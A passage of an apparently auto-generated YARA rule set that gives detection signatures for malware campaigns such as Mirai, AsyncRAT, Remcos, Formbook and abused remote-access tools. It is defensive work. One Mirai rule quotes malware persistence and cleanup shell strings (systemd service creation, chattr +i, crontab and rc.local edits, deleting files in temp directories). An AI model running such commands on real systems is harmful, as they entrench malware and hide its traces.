        $s8 = "m_pCfg || !\"Call SetConfig to use MB_DONTSHOWAGAIN\"" ascii
        $s9 = "WaitForSingleObject() FAILED - mutex: %s res: 0x%x (%d)" ascii
        $s10 = "SOFTWARE\\Productive Computer Insight\\PCICTL" ascii
        $s11 = "Creating NC_AUDIOFMT for replay, hash=%d" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7480048 and 12 of them
}

rule Sightlines_imphash_e98573c7_netsupport
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-e98573c7"
        date = "2026-10-22"
        campaign = "imphash-e98573c7"
        family = "netsupport"
        hash = "3f9cdacaf03050325aa554e4f7bc769ce2fe9554a06237a1ec8a191bade0bf18"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-e98573c7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Usage: %s (4 InheritableEventHandles) (CommandLineToSpawn)" ascii
        $s1 = "@Microsoft Visual C++ Runtime Library" wide
        $s2 = "NetSupport Remote Command Prompt" wide
        $s3 = "GPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPAD" ascii
        $s4 = "DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN" ascii
        $s5 = "@4@5D5H5L5P5T5X5\\5`5d5h5l5p5t5x5|5" ascii
        $s6 = "557;7A7G7M7S7Z7a7h7o7v7}7" ascii
        $s7 = "ConsoleWindowClass" ascii
        $s8 = "NetSupport Ltd" wide
        $s9 = "remcmdstub.exe" ascii
        $s10 = "1C1H1O1U1 2]2t2" ascii
        $s11 = "nKERNEL32.DLL" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ee036fe9_asyncrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ee036fe9"
        date = "2026-10-22"
        campaign = "tlsh-ee036fe9"
        family = "asyncrat"
        hash = "245dfa22e021f677270215518694d0c679693dbfc5e08686ad94a0c0dfe7a1dc"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ee036fe9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "QFleK/GdNye8ar8mgWXZFO5zWGu0LUhvR8Sp496MYRibJwBgDHgV+Gi9r6wj3kpf" ascii
        $s1 = "zWaHROTDwCeBUSDsrXEPd8AKcA74rKo+n0gkrm31G942Z+NcLtemqkdF5MeBjwID" ascii
        $s2 = "EBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/" ascii
        $s3 = "ICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AYWJjZGVmZ2hpamtsbW5v" ascii
        $s4 = "eJWmmnxhuAS1+OvL9GERM/ZlJbcRQovYaW7H/5W0gUOpfq6/gtZNzBGjg3FqEF4Z" ascii
        $s5 = "f3hHAjAM42VVnQEy9b6q7vYwyUiI/GrxvuberxXLvHphmpOXZ11dIJWKzdLy+j0N" ascii
        $s6 = "woQdDUgPqgaU8YIH9JnM5VL3mRfiBeiFuPjScQW9v6VBX8n0qoNz0fhtw/oE0pAI" ascii
        $s7 = "GBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BhYmNkZWZn" ascii
        $s8 = "Sve4kZm1o7VAXSlF5/KzcBOcnj/v6WEjaEQ4V1eNfqahsIgqubIDJ0zrpDPhNn96" ascii
        $s9 = "0eQDPEfUBEv9hQ3Sa7UKpfqotTVsmLJC1sm720D5vKzjbNgydVzfRc8N1txZPdGr" ascii
        $s10 = "OW+VeASwLbCwsNBmGMaAiAxRzSQcEZGdVLUKOtk6HYplYBa4parXgdNUJ+hes237" ascii
        $s11 = "uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn" ascii
    condition:
        filesize < 3689100 and 12 of them
}

rule Sightlines_tlsh_5807a46b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5807a46b"
        date = "2026-10-23"
        campaign = "tlsh-5807a46b"
        family = ""
        hash = "83c3dd36cc47df184e97ae167bf09cdb173ad3b5022fd6e3b81da50b640e2001"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5807a46b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/usr/lib/arm-linux-gnueabihf/crt1.o" ascii
        $s1 = "/usr/lib/arm-linux-gnueabihf/crtn.o" ascii
        $s2 = "/usr/lib/arm-linux-gnueabihf/crti.o" ascii
        $s3 = "__do_global_dtors_aux_fini_array_entry" ascii
        $s4 = "__libc_start_main@@GLIBC_2.4" ascii
        $s5 = "gethostbyname@@GLIBC_2.4" ascii
        $s6 = "_ITM_deregisterTMCloneTable" ascii
        $s7 = "__frame_dummy_init_array_entry" ascii
        $s8 = "/lib/ld-linux-armhf.so.3" ascii
        $s9 = "_ITM_registerTMCloneTable" ascii
        $s10 = "setsockopt@@GLIBC_2.4" ascii
        $s11 = "inet_addr@@GLIBC_2.4" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_65a3d861_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-65a3d861"
        date = "2026-10-23"
        campaign = "imphash-65a3d861"
        family = ""
        hash = "22387bf1bd80fb80d3b7379d37219449f06b0e445c38eca17cd7edb8891c6aaa"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-65a3d861.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " inflate 1.2.11 Copyright 1995-2017 Mark Adler " ascii
        $s1 = "    name=\"CompanyName.ProductName.YourApp\"" ascii
        $s2 = "Floating-point stack overflow or underflow" wide
        $s3 = "Floating-point underflow (exponent too small)" wide
        $s4 = "Floating-point overflow (exponent to great)" wide
        $s5 = "Exception handler returned unknown value" wide
        $s6 = "Exception handler tried to continue after non-continuable exception" wide
        $s7 = "Division by zero (floating-point)" wide
        $s8 = "        processorArchitecture=\"X86\"" ascii
        $s9 = "Invalid floating-point operation" wide
        $s10 = "Denormal floating-point operand" wide
        $s11 = "Inexact floating-point result" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_e17bd1d3_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e17bd1d3"
        date = "2026-10-23"
        campaign = "tlsh-e17bd1d3"
        family = ""
        hash = "269b268ad54168172f307ae50896b64735e3164946f4abc91c2e8257b0fb6300"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e17bd1d3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "N[C?K4WdL2A$?L38H*4D'OZEWaNWdMJV@SaEBR39I+?L3VaMfo]=H3amWdoYkub" ascii
        $s1 = "?qt_qFindChild_helper@@YAPEAVQObject@@PEBV1@AEBVQString@@AEBUQMetaObject@@V?$QFlags@W4FindChildOptio" ascii
        $s2 = "?glDiscardFramebufferEXT@QOpenGLExtensions@@QEAAXIHPEBI@Z" ascii
        $s3 = "?mouseDoubleClickEvent@QGraphicsProxyWidget@@MEAAXPEAVQGraphicsSceneMouseEvent@@@Z" ascii
        $s4 = "?modifiers@QGraphicsSceneContextMenuEvent@@QEBA?AV?$QFlags@W4KeyboardModifier@Qt@@@@XZ" ascii
        $s5 = "?qInstallMessageHandler@@YAP6AXW4QtMsgType@@AEBVQMessageLogContext@@AEBVQString@@@ZP6AX012@Z@Z" ascii
        $s6 = "?qt_metacall@QGraphicsDropShadowEffect@@UEAAHW4Call@QMetaObject@@HPEAPEAX@Z" ascii
        $s7 = "?d_func@QGraphicsPolygonItem@@AEBAPEBVQGraphicsPolygonItemPrivate@@XZ" ascii
        $s8 = "?isObscuredBy@QGraphicsPolygonItem@@UEBA_NPEBVQGraphicsItem@@@Z" ascii
        $s9 = "?modifiers@QGraphicsSceneDragDropEvent@@QEBA?AV?$QFlags@W4KeyboardModifier@Qt@@@@XZ" ascii
        $s10 = "?match@QRegularExpression@@QEBA?AVQRegularExpressionMatch@@AEBVQString@@HW4MatchType@1@V?$QFlags@W4M" ascii
        $s11 = "?boundingRect@QGraphicsPolygonItem@@UEBA?AVQRectF@@XZ" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 11161600 and 12 of them
}

rule Sightlines_imphash_e9e833e0_gh0strat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-e9e833e0"
        date = "2026-10-23"
        campaign = "imphash-e9e833e0"
        family = "gh0strat"
        hash = "4e50d7fcd52abdf13c2159b53b6a4fa7c6483c3eaebf3bf792db129e6fd80e73"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-e9e833e0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "function DownloadTemporaryFile(const Url, FileName, RequiredSHA256OfFile: String; const OnDownloadPr" ascii
        $s1 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s2 = "?TObjectDictionary<Winapi.Windows.HWND,Vcl.Themes.TSysStyleHook>M" ascii
        $s3 = "`TEnumerable<System.Generics.Collections.TPair<Winapi.Windows.HWND,Vcl.Themes.TChildControlInfo>>'" ascii
        $s4 = "\\TEnumerable<System.Generics.Collections.TPair<Winapi.Windows.HWND,Vcl.Themes.TSysStyleHook>>'" ascii
        $s5 = "LTDictionary<Winapi.Windows.HWND,Vcl.Themes.TChildControlInfo>.TKeyEnumerator;" ascii
        $s6 = "CTObjectDictionary<Winapi.Windows.HWND,Vcl.Themes.TChildControlInfo>M" ascii
        $s7 = "`TEnumerator<System.Generics.Collections.TPair<Winapi.Windows.HWND,Vcl.Themes.TChildControlInfo>>(" ascii
        $s8 = "ITDictionary<Winapi.Windows.HWND,Vcl.Themes.TSysStyleHook>.TPairEnumerator;" ascii
        $s9 = "\\TEnumerator<System.Generics.Collections.TPair<Winapi.Windows.HWND,Vcl.Themes.TSysStyleHook>>(" ascii
        $s10 = "JTDictionary<Winapi.Windows.HWND,Vcl.Themes.TSysStyleHook>.TValueEnumerator;" ascii
        $s11 = "Invalid time Offset string: %s$SHA2: Cannot update a finalized hash=Error decoding URL style (%%XX) " wide
    condition:
        uint16(0) == 0x5A4D and filesize < 40811752 and 12 of them
}

rule Sightlines_imphash_9613bd7a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-9613bd7a"
        date = "2026-10-23"
        campaign = "imphash-9613bd7a"
        family = ""
        hash = "36c3922133d08c3b05eda761d3d0667000729ec541a2b8c3dba443904bf88da9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-9613bd7a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Mrgpcvkml\"amorngvgf\"qwaagqqdwnn{" ascii
        $s1 = "Dbttrddqb{{n7zxs~q~rs7erp~dcen9" ascii
        $s2 = "`abcdefghijklmno" ascii
        $s3 = "Faejl{jk/fa{`/" ascii
        $s4 = "9!*+UVYZNtuo" ascii
        $s5 = "pTrA)XTrq)\\Uc" ascii
        $s6 = "Xo{excQoo\\\\\\" ascii
        $s7 = "013478=*,T" ascii
        $s8 = "9$*+UYOtu`" ascii
        $s9 = "9|f_QLaC!F" ascii
        $s10 = "Z dXR1>,Q." ascii
        $s11 = "CEVYDVTC^XY" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10848256 and 12 of them
}

rule Sightlines_tlsh_dca7dcdc_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-dca7dcdc"
        date = "2026-10-23"
        campaign = "tlsh-dca7dcdc"
        family = ""
        hash = "5143aa3e277c58918935281938d99e668ed3bdddf80578b17a0ad16d4556bf15"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-dca7dcdc.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Mrgpcvkml\"amorngvgf\"qwaagqqdwnn{" ascii
        $s1 = "Dbttrddqb{{n7zxs~q~rs7erp~dcen9" ascii
        $s2 = "Amo1Amo5Amo;Amo\"Amo+Amo/AmoSAmo[AmoLAmoyAmoaAmo" ascii
        $s3 = "@mo0@mo3@mo8@mo?@mo,@moY@moE@mov@mo`@mo" ascii
        $s4 = "soo3soo:soo#soo'soo+sooSsooDsooqsooysoolsoo" ascii
        $s5 = "0looPhoo8loo)looXlooGlooyloojloo" ascii
        $s6 = "roo0roo7roo$rooQroo]rooNrooxrookroo" ascii
        $s7 = "aoo6aoo aoo'aoo@aooDaooGaooNaoo~aoo" ascii
        $s8 = "eoo2eoo:eoo#eoo.eooYeooFeooreoo~eoo" ascii
        $s9 = "ioo8ioo ioo)iooTioo_iooLiooxioodioo" ascii
        $s10 = "moo;moo'mooRmooZmooCmooNmooymoofmoo" ascii
        $s11 = "`oo4`oo#`oo^`ooC`ooJ`ooy`oo``ook`oo" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3244032 and 12 of them
}

rule Sightlines_tlsh_edf4559a_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-edf4559a"
        date = "2026-10-23"
        campaign = "tlsh-edf4559a"
        family = "connectwise"
        hash = "1f01ff480f1e0efd0361c7647b1d8de8b8a0b086a4864fe7d65f1ab8f1997c31"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-edf4559a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "24?69<>BNPREDHKMY_aTVX[]dftsihlnprvw$&($&(|{" wide
        $s1 = "394821E67B}NOT EXCLUDE_BACKSTAGE_SHELLScreenConnect.WindowsBackstageShell.exeFileManagerFiles{80C42F" ascii
        $s2 = "E1-27A8-4EB1-896F-161D3237D864}NOT EXCLUDE_FILE_MANAGERScreenConnect.WindowsFileManager.exeServiceFi" ascii
        $s3 = "ationPackage.dllCredentialProviderFiles{595C1B10-5F3C-42F7-B006-5D9C44DEC4FF}NOT EXCLUDE_CREDENTIAL_" ascii
        $s4 = "TNetFramework40ClientCustomActionLibraryWixCAMainFiles{E0EF5F66-7B92-40DE-8B20-EB91E1C859BB}INSTALLL" ascii
        $s5 = "ge.dll]reg86A6324C5FADB6CB634CB54F9A254136CLSID\\[CREDENTIAL_PROVIDER_CLASS_ID][ProductName] Credenti" ascii
        $s6 = "OCATIONNOT EXCLUDE_MAINScreenConnect.ClientService.dllBackstageShellFiles{DDCF1E82-0B14-4C68-A063-33" ascii
        $s7 = "1BB32EEE98CBEDESoftware\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727InstallSOFTWARE\\Microsoft\\NET Fr" ascii
        $s8 = "\"[INSTALLLOCATION]ScreenConnect.WindowsClient.exe\" \"%1\"reg3831C0C36D9CE44BC3E6FAE6F161BEA8System\\Cur" ascii
        $s9 = "urrentVersion\\Authentication\\Credential Providers\\[CREDENTIAL_PROVIDER_CLASS_ID]reg685500C4A1A36BBDF" ascii
        $s10 = "3BF2B6E27BUseOriginalUrlEncoding#1regED314AE69CE5D835D523FB365C82C36B[URL_SCHEME]\\shell\\open\\command" ascii
        $s11 = "OMODIFYALLUSERS1ManufacturerScreenConnect SoftwareProductCode{B292C5EA-BF5F-4280-B056-1670FB10BB1D}P" ascii
    condition:
        filesize < 19922944 and 12 of them
}

rule Sightlines_tlsh_91f431a3_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-91f431a3"
        date = "2026-10-21"
        campaign = "tlsh-91f431a3"
        family = "mirai"
        hash = "18b5057e1f21d9999af1799e1a18f1fb21a2d043d303f67563f4fd4bd8dcca42"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-91f431a3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "(atomic/exe) Killed process: %s, PID: %d" ascii
        $s2 = "(atomic/maps) Killed Process: %s, PID: %d" ascii
        $s3 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s4 = "/usr/libexec/openssh/sftp-server" ascii
        $s5 = "HOST: 255.255.255.255:1900" ascii
        $s6 = "/usr/lib/systemd/systemd" ascii
        $s7 = "MAN: \"ssdp:discover\"" ascii
        $s8 = "M-SEARCH * HTTP/1.1" ascii
        $s9 = "/usr/compress/bin/" ascii
        $s10 = "/root/dvr_gui/" ascii
        $s11 = "/root/dvr_app/" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_signer_cert_sha1_2cf78abf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-2cf78abf"
        date = "2026-10-22"
        campaign = "signer_cert_sha1-2cf78abf"
        family = ""
        hash = "0f885b509a685d2bbfa652fed26b5fb31d88fbdab0a978c641d1c7b8aa460aa9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-2cf78abf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "260515184909Z0t1" ascii
        $s1 = "230217+5049170" ascii
        $s2 = "230889+5049200" ascii
        $s3 = "260515182606Z0" ascii
        $s4 = "250515184909Z" ascii
        $s5 = "250515182606Z" ascii
        $s6 = "G!2Wv[.O" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1115456 and 7 of them
}

rule Sightlines_signer_cert_sha1_142fb118_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-142fb118"
        date = "2026-10-22"
        campaign = "signer_cert_sha1-142fb118"
        family = ""
        hash = "184146852727a9db4eea06178716bec3cdbb1015c911f6b0f915b184ad7775b2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-142fb118.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "260515184910Z0t1" ascii
        $s1 = "230217+5049070" ascii
        $s2 = "230889+5049100" ascii
        $s3 = "260515182607Z0" ascii
        $s4 = "250515182607Z" ascii
        $s5 = "250515184910Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1107104 and 6 of them
}

rule Sightlines_host_93c2dc5c_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-93c2dc5c"
        date = "2026-10-21"
        campaign = "host-93c2dc5c"
        family = "mirai"
        hash = "00b8c81a2b43524469dd3fa7a121e8c8701e7355ae5440bf108a54daac958fff"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-93c2dc5c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/var/tmp/%s\\nRestart=on-failure\\nRestartSec=30\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/syst" ascii
        $s1 = "printf '[Unit]\\nDescription=System Service\\nAfter=network.target\\n[Service]\\nType=simple\\nExecStart=" ascii
        $s2 = "echo '0' > /proc/sys/kernel/pid_max 2>/dev/null" ascii
        $s3 = "crontab -l 2>/dev/null | grep -v '%s' | crontab - 2>/dev/null" ascii
        $s4 = "find /tmp /var/tmp /dev/shm /root -name '*%s*' -delete 2>/dev/null" ascii
        $s5 = "chmod +x /var/tmp/%s /usr/lib/%s 2>/dev/null" ascii
        $s6 = "systemctl daemon-reload 2>/dev/null; systemctl enable %s 2>/dev/null" ascii
        $s7 = "rm -f /lib/systemd/system/%s.service 2>/dev/null" ascii
        $s8 = "systemctl stop %s 2>/dev/null; systemctl disable %s 2>/dev/null" ascii
        $s9 = "sed -i '/%s/d' /etc/rc.local 2>/dev/null" ascii
        $s10 = "rm -f /etc/systemd/system/%s.service 2>/dev/null" ascii
        $s11 = "chattr +i /var/tmp/%s 2>/dev/null" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_4b1fd03c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-4b1fd03c"
        date = "2026-10-22"
        campaign = "dotnet_typelib_guid-4b1fd03c"
        family = ""
        hash = "5ae667a2ffce6864964f906c2ec7049b342a534ebb8e38a8d0640e6656e0de7a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-4b1fd03c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "A+ (Vrhunsko porinuce brodogradilista Klajd)" wide
        $s4 = "Uslovno prihvatljivo (B-) - Zaustavni put je bio preblizu suprotne obale reke Klajd. Potrebna je rev" wide
        $s5 = "5. Vodonepropusno ispitivanje tankova (88%):" wide
        $s6 = "Faza 3: Izbijeni drveni klinovi! Trup klizi krmom napred u reku Klajd." wide
        $s7 = "Reka Klajd (Visoka voda / Plima +3.75 m)" wide
        $s8 = "The value for column 'c' in table 'DataTable1' is DBNull." wide
        $s9 = "Izgradnja trupa kompletirana 100%! Spreman za podmazivanje i porinu" wide
        $s10 = "Moment uzgona nadvladava moment mase. Kobilica se rotira, prednje sanke primaju vr" wide
        $s11 = "4. Pneumatsko i rucno zakivanje (92%):" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2542592 and 12 of them
}

rule Sightlines_imphash_1c2c9a7a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-1c2c9a7a"
        date = "2026-10-22"
        campaign = "imphash-1c2c9a7a"
        family = ""
        hash = "3a62ba9d46cb84d3e77a2a45285c6b354bdd7a7944ca30ad6d486939b5a0a729"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-1c2c9a7a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" wide
        $s1 = "Elevation:Administrator!new:" wide
        $s2 = "%s_%s_tempchunk_%d" ascii
        $s3 = "D$XHcD$DH;D$Xs" ascii
        $s4 = "D$(HcD$HHcL$(H" ascii
        $s5 = "D$@H;D$Xt8H" ascii
        $s6 = "D$PH;D$Xs^H" ascii
        $s7 = "D$HH;D$htqH" ascii
        $s8 = "D$d;D$hr7H" ascii
        $s9 = "D$p;D$tt#H" ascii
        $s10 = "$H;D$0sPH" ascii
        $s11 = "T$0HcD$(H" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1527808 and 12 of them
}

rule Sightlines_tlsh_ab89c663_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ab89c663"
        date = "2026-10-22"
        campaign = "tlsh-ab89c663"
        family = "mirai"
        hash = "04bdee4f273e2b4d2e1f05c9babfd772f19f7f92eadb6221c42254d683ee2963"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ab89c663.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "1u1$)&u+17u)qdE" ascii
        $s1 = "wq\"x{JDJK" ascii
        $s2 = "-0+1prp|" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 3 of them
}

rule Sightlines_tlsh_8cfbe6a7_formbook
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8cfbe6a7"
        date = "2026-10-22"
        campaign = "tlsh-8cfbe6a7"
        family = "formbook"
        hash = "29215ad7f765f085a93eebf9be3fc2a1c80e38c897b88a92d4b9467bdefc8dd0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8cfbe6a7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Week {0} [CRITICAL ALERT]: Equipment malfunction detected! Nitrate spiked and stress occurred." wide
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "Turnover & Flow: 32.9x | Rating: Exemplary" wide
        $s3 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s4 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s5 = "C | Alk 8.6 dKH | Ca 425 ppm | Phase: Pristine" wide
        $s6 = "Dynamic Reef Cross-Section & Sump Ecosystem" wide
        $s7 = "Turnover & Flow: {0:F1}x | Rating: {1}" wide
        $s8 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator" ascii
        $s9 = "Week 0: Aquarium baseline re-initialized." wide
        $s10 = "Saltwater Aquarium - Reef Section & Sump Station" wide
        $s11 = "Amphiprion ocellaris, Zebrasoma flavescens" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1673216 and 12 of them
}

rule Sightlines_host_36996cf5_phorpiex
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-36996cf5"
        date = "2026-10-22"
        campaign = "host-36996cf5"
        family = "phorpiex"
        hash = "1b650dc35f75c9b962c54dfd1cacd9bbedf8708a4870218c4bbb07a76b4d1ba3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-36996cf5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchit" ascii
        $s1 = "GPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING" ascii
        $s2 = "%s:Zone.Identifier" wide
        $s3 = "__wgetmainargs" ascii
        $s4 = "MSVCR90.dll" ascii
        $s5 = "%appdata%" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_c6c31d76_remcos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c6c31d76"
        date = "2026-10-22"
        campaign = "tlsh-c6c31d76"
        family = "remcos"
        hash = "0232bf46ac0ed7b952249aa160285de7c05ceac0447a39ff5a9c0939192ae4d8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c6c31d76.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "'' SIG '' gjcCAR4wJAIBAQQQTvApFpkntU2P5azhDxfrqwIBAAIB" ascii
        $s1 = "antikvarboghandlersincomp = MidB(\"Sonambulisternes\", 164, 134)" ascii
        $s2 = "Cytoreticulumdi157 = Replace(\"Taiwanske\",\"Aefaldy172\",\"Melaenic\")" ascii
        $s3 = "Kiesternonverminouslybal = Replace(\"Connexure77\",\"Udbytterigst255\",\"Expostulated\")" ascii
        $s4 = "Rem Systemgrafers182, etholog: outwinds skummedes172? spartacide;" ascii
        $s5 = "Rem Apyrous. citha! pil sponsorskab235, gasarten138!" ascii
        $s6 = "Rem Udskiftningsspilleres200 angivere67 paraffinlyss, cherubim dashikis175:" ascii
        $s7 = "Siriassvarmulighedsmensur = Replace(\"Desultorious\",\"Underkendt\",\"beblotch\")" ascii
        $s8 = "Rem Algorithmic: unexpressably wharfland;" ascii
        $s9 = "Rem Udetj. kvikslv140 subintentionally, lyseslukkeren: babuls239." ascii
        $s10 = "Rem Indboforsikringernes. candiel: ridderhatte. multiphastic59! hyalography" ascii
        $s11 = "Rem Blackburn stenotypist145: sover; nontypographically" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_41ec346c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-41ec346c"
        date = "2026-10-22"
        campaign = "tlsh-41ec346c"
        family = ""
        hash = "855dc4b6ae1f10a5bb4d7ee450e536020fe495079f1a2f1b39a334ec03a68150"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-41ec346c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "1u1$)&u+17u)qdE" ascii
        $s1 = "wq\"x{JDJK" ascii
        $s2 = "TKih8Lkh8" ascii
        $s3 = "-0+1prp|" ascii
        $s4 = "kjk8Ki(8" ascii
        $s5 = "Lih8mih8" ascii
        $s6 = "hi8+hi8_" ascii
        $s7 = "lih8Mih8" ascii
        $s8 = "jjj8*i(8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_imphash_50a09960_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-50a09960"
        date = "2026-10-22"
        campaign = "imphash-50a09960"
        family = ""
        hash = "0be1298198e9ba2fa22ddcd6f1f0ef4f239d97ec0767e0ba083ae97bcc18945f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-50a09960.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "LuaJIT 2.1.0-beta3 -- Copyright (C) 2005-2017 Mike Pall. http://luajit.org/" ascii
        $s1 = "bad FPU precision (use D3DCREATE_FPU_PRESERVE with DirectX)" ascii
        $s2 = "JIT compiler disabled, CPU does not support SSE2" ascii
        $s3 = "  -O[opt]   Control LuaJIT optimizations." ascii
        $s4 = "unknown or malformed optimization flag '%s'" ascii
        $s5 = "unknown luaJIT command or jit.* modules not installed" ascii
        $s6 = "PANIC: unprotected error in call to Lua API (" ascii
